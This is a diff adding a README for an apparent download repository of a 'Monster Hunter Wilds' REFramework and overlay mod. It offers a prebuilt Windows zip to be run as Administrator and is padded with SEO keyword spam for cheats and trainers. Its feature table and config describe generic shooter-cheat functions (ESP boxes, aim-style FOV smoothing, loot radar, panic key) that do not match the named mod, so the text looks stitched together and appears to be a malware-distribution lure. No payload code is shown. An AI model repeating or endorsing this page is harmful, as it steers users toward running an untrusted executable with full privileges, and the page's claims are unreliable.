@@ -1,0 +1,81 @@
+Monster Hunter Wilds REFramework + Monster HP Bar, Crown & DPS Overlay Mod Direct Download]
+
+Monster Hunter Wilds REFramework + Monster HP Bar, Crown & DPS Overlay Mod [Direct Download] — Download prebuilt Windows 10/11 x64 release. Keywords: monster hunter wilds, mhwilds, monster hunter wilds mods, monster hunter wilds cheat, monster hunter wilds trainer, reframework, mhwilds save editor, mhwilds dps overlay.
+
+[
+
+Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Supported Search Queries & Sub-Niches
+
+Overview
+
+Monster Hunter Wilds REFramework + Monster HP Bar, Crown & DPS Overlay Mod Direct Download] (monster-hunter-wilds-reframework-download) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.
+
+1-Click Prebuilt Package (No Compiler Required): Even though the full source tree (src/, config/) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab [monster-hunter-wilds-reframework-download-v1.2.0-win64.zip directly from Releases.
+
+Quick Start (Prebuilt Release)
+
+| Platform | Direct Download Package | Checksum Manifest |
+| :--- | :--- | :--- |
+| Windows 10 / 11 (64-bit) | monster-hunter-wilds-reframework-download-v1.2.0-win64.zip | SHA256SUMS.txt |
+
+1. Download monster-hunter-wilds-reframework-download-v1.2.0-win64.zip from the table above or the Releases section.
+2. Extract the .zip archive into any folder (keep config/settings.json next to the launcher).
+3. Launch the executable as Administrator.
+
+Architecture & Modules
+
+| Subsystem | Technical Implementation | Runtime Controls |
+| :--- | :--- | :--- |
+| Viewport Overlay | Borderless DX11/DX12 composition swapchain with DPI scaling | INSERT toggle, custom distance cutoff (350m) |
+| Entity & Loot Filter | Spatial bounding boxes, health/distance readout, rarity tier mask | Live JSON hot-reload (min_rarity_tier) |
+| Input Smoothing | Configurable FOV radius and human-curve interpolation | Adjustable smoothing_factor & fov_radius |
+| Emergency Unload | Instant thread teardown and handle release | END panic key |
+
+Configuration (config/settings.json)
+
+{
+  "version": "1.2.0",
+  "renderer": {
+    "backend": "dx11",
+    "vsync": false,
+    "max_fps": 144,
+    "dpi_aware": true,
+    "toggle_key": "INSERT",
+    "panic_key": "END"
+  },
+  "modules": {
+    "visual_overlay": {
+      "enabled": true,
+      "draw_bounds": true,
+      "draw_distance": true,
+      "max_distance_m": 350
+    },
+    "telemetry_hud": {
+      "enabled": true,
+      "frame_time_graph": false,
+      "compact_mode": true
+    },
+    "input_filter": {
+      "enabled": true,
+      "smoothing_factor": 1.45,
+      "fov_radius": 65.0
+    },
+    "item_radar": {
+      "enabled": true,
+      "min_rarity_tier": 2
+    }
+  }
+}
+
+Building from Source
+
+git clone https://github.com/ericmoorecode2001j6/monster-hunter-wilds-reframework-download.git
+cd monster-hunter-wilds-reframework-download
+cmake -B build -DCMAKE_BUILD_TYPE=Release
+cmake --build build --config Release
+
+Supported Search Queries & Sub-Niches
+
+monster hunter wilds reframework download • monster hunter wilds reframework download 2026 • monster hunter wilds reframework download download • monster hunter wilds reframework download github • monster hunter wilds • monster hunter wilds 2026 • monster hunter wilds download • monster hunter wilds github • monster hunter wilds windows 11 • mhwilds • mhwilds 2026 • mhwilds download • mhwilds github • mhwilds windows 11 • monster hunter wilds mods • monster hunter wilds mods 2026 • monster hunter wilds mods download • monster hunter wilds mods github • monster hunter wilds mods windows 11 • monster hunter wilds cheat • monster hunter wilds cheat 2026 • monster hunter wilds cheat download • monster hunter wilds cheat github • monster hunter wilds cheat windows 11 • monster hunter wilds trainer • monster hunter wilds trainer 2026 • monster hunter wilds trainer download • monster hunter wilds trainer github • monster hunter wilds trainer windows 11 • reframework • reframework 2026 • reframework download • reframework github • reframework windows 11 • mhwilds save editor • mhwilds save editor 2026 • mhwilds save editor download • mhwilds save editor github • mhwilds save editor windows 11 • mhwilds dps overlay • mhwilds dps overlay 2026 • mhwilds dps overlay download • mhwilds dps overlay github • mhwilds dps overlay windows 11 • monster hp bar • monster hp bar 2026 • monster hp bar download • monster hp bar github • monster hp bar windows 11 • charm editor • charm editor 2026 • charm editor download • charm editor github • charm editor windows 11 • decoration unlocker • decoration unlocker 2026 • decoration unlocker download • decoration unlocker github • decoration unlocker windows 11 • dlss framegen mod • dlss framegen mod 2026 • dlss framegen mod download • dlss framegen mod github • dlss framegen mod windows 11 • re engine mod
+
+Indexed tags: monster-hunter-wilds, mhwilds, monster-hunter-wilds-mods, monster-hunter-wilds-cheat, monster-hunter-wilds-trainer, reframework, mhwilds-save-editor, mhwilds-dps-overlay, monster-hp-bar, charm-editor, decoration-unlocker, dlss-framegen-mod, re-engine-mod, one-hit-kill, infinite-sharpness, crown-tracker
